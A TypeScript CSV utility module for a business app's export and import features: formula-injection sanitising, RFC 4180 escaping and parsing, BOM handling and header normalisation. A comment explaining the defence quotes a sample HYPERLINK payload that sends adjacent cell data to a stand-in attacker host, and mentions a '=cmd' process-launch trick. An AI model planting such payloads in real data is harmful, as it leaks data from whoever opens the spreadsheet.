/**
 * CSV encoding, with the two things people get wrong.
 *
 * CSV sits beside the real .xlsx (lib/xlsx.ts) in the download centre: it is
 * what other systems import, and what opens anywhere without Excel.
 */

/**
 * SPREADSHEET FORMULA INJECTION - the reason `sanitise` exists.
 *
 * Excel and Google Sheets treat a cell beginning with `=`, `+`, `-` or `@` as a
 * FORMULA, not text. So a customer named
 *
 *     =HYPERLINK("http://evil.example/"&A1,"Click")
 *
 * becomes a live link in the accountant's spreadsheet, populated with data from
 * the row next to it. Older Excel builds will run `=cmd|...` and launch a
 * process. The data was typed by a customer into a name field; the harm lands
 * on whoever opens the export.
 *
 * The fix is a leading apostrophe, which Excel strips on display but which
 * stops the cell being parsed as a formula. It is one line, and it is the
 * difference between an export and a delivery mechanism.
 *
 * Tab and carriage return are included because they are stripped by some
 * parsers before the formula check runs, which would sneak `=` back to the
 * front.
 */
const RISKY_START = /^[=+\-@\t\r]/;

export function sanitise(value: string): string {
  return RISKY_START.test(value) ? `'${value}` : value;
}

/**
 * One cell, escaped.
 *
 * Quotes are doubled and the whole field wrapped whenever it contains a comma,
 * a quote or a newline - the RFC 4180 rules. A field containing a newline is
 * legal and common (an address), and getting this wrong shifts every subsequent
 * column by one, silently, for the rest of the file.
 */
export function cell(value: unknown): string {
  if (value === null || value === undefined) return '';

  let s: string;
  if (value instanceof Date) {
    s = value.toISOString();
  } else if (typeof value === 'number') {
    // Numbers are never sanitised - a negative number legitimately starts with
    // a minus, and quoting it would make Excel read it as text and refuse to
    // sum the column.
    return Number.isFinite(value) ? String(value) : '';
  } else if (typeof value === 'boolean') {
    return value ? 'Yes' : 'No';
  } else {
    s = String(value);
  }

  s = sanitise(s);

  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

export interface CsvColumn<T> {
  header: string;
  value: (row: T) => unknown;
}

/**
 * Rows to a CSV string.
 *
 * CRLF line endings, because Excel on Windows - which is what a client in
 * Bhilai is running - treats a bare LF file as one long line in some versions.
 */
export function toCsv<T>(rows: T[], columns: CsvColumn<T>[]): string {
  const lines = [columns.map((c) => cell(c.header)).join(',')];
  for (const row of rows) {
    lines.push(columns.map((c) => cell(c.value(row))).join(','));
  }
  return lines.join('\r\n');
}

/**
 * The UTF-8 byte order mark.
 *
 * Without it, Excel opens a UTF-8 CSV as Windows-1252 and every rupee sign
 * becomes `â‚¹`. Every non-English customer name is mangled the same way. It is
 * three bytes and it is the difference between a usable export and a support
 * call.
 */
export const BOM = '﻿';

/** `sales-invoices-2026-09-09.csv` - sortable, and safe on every filesystem. */
export function fileName(reportId: string, from?: Date, to?: Date): string {
  const d = (x: Date) => x.toISOString().slice(0, 10);
  const range = from && to ? `-${d(from)}_${d(to)}` : from ? `-${d(from)}` : '';
  return `${reportId}${range}.csv`;
}

/**
 * Parsing, for Import Data.
 *
 * Hand-written rather than a library - RFC 4180 is small enough to get right
 * in one pass, and the one thing worth being careful about (a quoted field
 * holding a comma, a newline, or an escaped `""`) is exactly what a naive
 * `split(',')` gets wrong. A wrongly-split row shifts every column after it,
 * silently, which for an import means a phone number lands in the GSTIN
 * field on every row from that point on.
 *
 * Handles both `\n` and `\r\n` line endings, since a CSV re-saved by Excel on
 * Windows and one exported from a Mac tool are both things a client will
 * upload without knowing the difference.
 */
export function parseCsv(text: string): string[][] {
  // Strip a leading BOM - Excel writes one (see `BOM` above), and left in
  // place it attaches itself to the first header's name, so "Phone" becomes
  // an unmatched "﻿Phone" and every phone number in the file is silently
  // dropped from the import.
  const src = text.charCodeAt(0) === 0xfeff ? text.slice(1) : text;

  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let inQuotes = false;
  let i = 0;

  const endField = () => { row.push(field); field = ''; };
  const endRow = () => { endField(); rows.push(row); row = []; };

  while (i < src.length) {
    const c = src[i];

    if (inQuotes) {
      if (c === '"') {
        if (src[i + 1] === '"') { field += '"'; i += 2; continue; }
        inQuotes = false; i += 1; continue;
      }
      field += c; i += 1; continue;
    }

    if (c === '"') { inQuotes = true; i += 1; continue; }
    if (c === ',') { endField(); i += 1; continue; }
    if (c === '\r') { i += 1; continue; } // consumed; \n (or end of input) ends the row
    if (c === '\n') { endRow(); i += 1; continue; }
    field += c; i += 1;
  }

  // A file with no trailing newline still has a final field and row to flush.
  // A genuinely empty file (or one that ended exactly on a newline) must not
  // produce a phantom blank row - checked against field AND row-so-far, since
  // an empty field after a real column is legitimate ("Smith,,9876543210").
  if (field !== '' || row.length > 0) endRow();

  return rows;
}

/**
 * The parsed rows as objects, keyed by a normalised header.
 *
 * Normalising strips the exact-casing and exact-spacing dependence a raw
 * header match would have - "Phone Number", "phone number" and "PHONE NUMBER"
 * all become the same key, which is what lets a template downloaded once
 * still match a column a client has re-typed by hand.
 */
export function normaliseHeader(h: string): string {
  return h.trim().toLowerCase().replace(/\s+/g, ' ');
}

export function rowsToObjects(matrix: string[][]): { headers: string[]; rows: Record<string, string>[] } {
  if (matrix.length === 0) return { headers: [], rows: [] };
  const [headerRow, ...dataRows] = matrix;
  const headers = headerRow.map(normaliseHeader);

  const rows = dataRows
    // A wholly blank row - trailing newline in the file, or a gap someone left
    // on purpose - carries no data and would otherwise become a row every
    // required-field check rejects for no reason a person can see.
    .filter((r) => r.some((cell) => cell.trim() !== ''))
    .map((r) => {
      const obj: Record<string, string> = {};
      headers.forEach((h, idx) => { obj[h] = (r[idx] ?? '').trim(); });
      return obj;
    });

  return { headers, rows };
}
